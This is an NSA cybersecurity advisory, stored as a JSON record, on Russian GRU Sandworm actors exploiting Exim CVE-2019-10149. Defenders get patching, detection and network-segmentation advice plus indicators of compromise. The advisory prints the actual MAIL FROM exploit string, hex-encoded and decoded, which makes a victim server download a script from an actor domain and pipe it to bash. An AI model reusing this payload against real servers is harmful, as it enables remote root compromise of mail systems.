{
  "markdown": "  \nU/OO/140 757-20     PP-20-0393           28 May 2020  \nNational Security Agency  | Cybersecurity Advisory  \n \n SANDWORM ACTORS EXPLOITING VULNERABILITY IN \nEXIM MAIL TRANSFER AGENT  \nSummary  \nRussian cyber actors from  the GRU Main Center for Special Technologies (GTsST), field post number 74455, have been \nexploiting a vulnerability in Exim Mail Transfer Agent (MTA) software s ince at least August 2019. The cyber actors \nresponsible for this malicious cyber program are known publicly as Sandworm team.  \nExim is a commonly used MTA software for Unix1-based systems and comes pre -installed on some Linux distributions \nsuch as Debian2. On 5 June 2019, an update for a critical vulnerability (CVE -2019 -10149) in Exim was released. The \nremote code execution vulnerability was introduced in Exim version 4.87. An  unauthenticated remote attacker can send a \nspecially crafted email to execute commands with root privileges allowing the attacker to install programs, modify data, \nand create new accounts [1]. An advisory was published to the Exim webpage urging users to update to the newest \nversion as  older versions are unsupported  [2]. \nThe actors exploited victims using Exim soft ware on their public facing MTA s by sending a command in the \"MAIL FROM\" \nfield of an SMTP (Simple Mail Transfer Protocol) message. Below is a sa mple, which contains parameters the actor would \nmodify per deployment.  \n \nFigure 1: Sample MAIL FROM exploitation command  \n \nWhen CVE -2019 -10149 is successfully exploited, an actor is able to execute code of their choosing. When Sandworm \nexploited CVE -2019 -10149, the victim machine would subsequently download and execute  a shell script from a \nSandworm -controlled domain. This script would attempt to do the following on the victim machine:  \n add privileged users  \n disable network security settings  \n update SSH  configurations to enable additional remote access  \n execute an additional script to enable follow -on exploitation  \nMitigation Actions  \nApply Exim Updates Immediately  \nUpdate Exim immediately by installing version 4.93 or newer to mitigate this and other vulner abilities. Other vulnerabilities \nexist and are likely to be exploited, so the latest fully patched version should be used [3]. Using a previous version of Exi m \n                                            \n1 Unix is a registered trademark of The Open Group.  \n2 Debian is a registered trademark of Software in the Public Interest, Inc.  MAIL FROM:<${run{ \\x2Fbin\\x2Fsh\\t-\nc\\t\\x22exec\\x20\\x2Fusr\\x2Fbin\\x2Fwget\\x20\\x2DO\\x20\\x2D\\x20http\\:\\x2F\\x2F\\hostapp.be \\x2Fscript1.sh \\x20\\x7C\\\nx20bash\\x22}}@hostapp.be>  \nHex decoded comma nd: \n/bin/sh -c \"exec /usr/bin/wget -O - http://hostapp.be/script1.sh | bash\"  \n\n \n \nU/OO/140 757-20    PP-20-0393          28 May 2020   \n 2 leaves a system vulnerable to exploitation. System administrators should continually check softw are versions and update \nas new versions become available [4].  \nAdministrators can update Exim Mail Transfer Agent software through their Linux distributions package manager or by \ndownloading the latest version from https://exim.org/mirrors.html . \nDetect Exploit Attempts and Unauthorized Changes  \nAdditionally, network -based security appliances may be able to detect and/or block CVE -2019 -10149 exploit attempts. For \nexample, Sno rt3 rule 1 -50356 alerts on exploit  attempts by default for registered users of a Snort Intrusion Detection \nSystem (IDS) [5]. Administrators are encouraged to review network security devices protecting Exim mail servers both for \nidentifying prior exploitat ion and for ensuring network -based protection for any unpatched Exim servers. Raw traffic logs \ncan also be queried for emails with a recipient containing ${run, which would likely indicate a CVE -2019 -10149 exploit \nattempt. Other attack methods exist for non-default configurations and may not be detected using these methods.  \nRoutinely verifying no unauthorized  system modifications, such as additional accounts and SSH keys, have occurred can \nhelp detect a compromise. To detect these modifications, administr ators can use file integrity monitoring software that \nalerts an administrator or blocks unauthorized changes on the system.  \nApply Defense -in-Depth Security Strategy  \nSecurity principles such as least access models and defense -in-depth should be applied when  installing public facing \nsoftware such as MTAs and can help prevent exploitation attempts from being successful. Network segmentation should \nbe used to separate networks into zones based on roles and requirements. Public facing MTAs should be isolated fro m \nsensitive internal resources in a demilitarized zone (DMZ) enclave. When using a DMZ for public Internet facing systems, \nfirewall rules are important to block unexpected traffic from reaching trusted internal resources. In addition, MTAs should \nonly be a llowed to send outbound traffic to necessary ports (e.g. 25, 465, 587), and unnecessary destination ports should \nbe blocked. Least access model firewall rules around a DMZ can inhibit attackers from gaining unauthorized access, as \nunexpected port traffic s hould be blocked by default.  \nIf an MTA DMZ was configured in a least access model, for example to deny by default MTA initiated outbound traffic \ndestined for port 80/443 on the Internet while only permitting traffic initiated from an MTA to necessary hosts  on port \n80/443, the actors method of using CVE -2019 -10149 would have been mitigated.  \nIndicators of Compromise (IOC)  \nSince at least August 2019, the following IP addresses and domains were associated with these attacks from the \nSandworm actor:  \n 95.216.13. 196  \n 103.94.157.5  \n hostapp.be  \nWorks Cited  \n[1] Narang, S. (2019), CVE -2019 -10149: Critical Remote Command Execution Vulnerability Discovered in Exim. [Online] Available at: \nhttps://tenable.com/blog/cve -2019 -10149 -critical -remote -command -execution -vulnerability -discovered -in-exim  [Accessed Feb. 12, 2020]   \n[2] Exim (2019). CVE -2019 -10149 Exim 4.87 to 4.91. [Online] Available at: https://www.exim.org/static/doc/security/CVE -2019 -10149.txt  \n[Accessed Feb. 12, 2020]  \n[3] NCSC (2019). Advisory: Exim mail server vulnerabilities. [Online] Available at: https://www.ncsc.gov.uk/news/exim -mail-server -vulnerabilities -\nadvisory  [Accessed Feb. 12, 2020]  \n[4] NSA (2019). Update and Upgrade Software Immediately. [Online] Available at: https://media.defense.gov/2019/Sep/09/2002180319/ -1/-\n1/0/UPDATE AND UPGRADE SOFTWARE IMMEDIATELY.PDF  [Accessed Feb. 12, 2020]  \n[5] The Snort Team (2019). Sid 1 -50356. [Online] Available at https://snort.org/rule_docs/1 -50356  [Accessed Feb. 12, 2020]  \n                                            \n3 Snort is a registered trademark of Cisco Technology, Inc.  \n\n \n \nU/OO/140 757-20    PP-20-0393          28 May 2020   \n 3 Disclaimer of Endorsement  \nThe information and opinions contained in this document are provided \"as is\" and without any warranties or guarantees. Refere nce herein to any specific \ncommercial products, process, or service by trade name, trademark, manufacturer, or otherwis e, does not constitute or imply its endorsement, \nrecommendation, or favoring by the United States Government, and this guidance shall not be used for advertising or product e ndorsement purposes.  \nContact  \nClient Requirements / General Cybersecurity Inquiries : Cybersecurity Requirements Center , 410 -854-4200,  Cybersecurity_Requests@nsa.gov   \nMedia inquiries / Press Desk: 443 -634-0721, MediaRelations@nsa.gov   \n\n",
  "cves": [],
  "techniques": [],
  "advisory": "cybersecurity-alerts",
  "title": "csa sandworm actors exploiting vulnerability in exim transfer agent 20200528",
  "source": "nsa",
  "id": "91511897df8e27edc6c41a01f654f4f1cba02cc4c7ecc8bc1d375bc49269e847"
}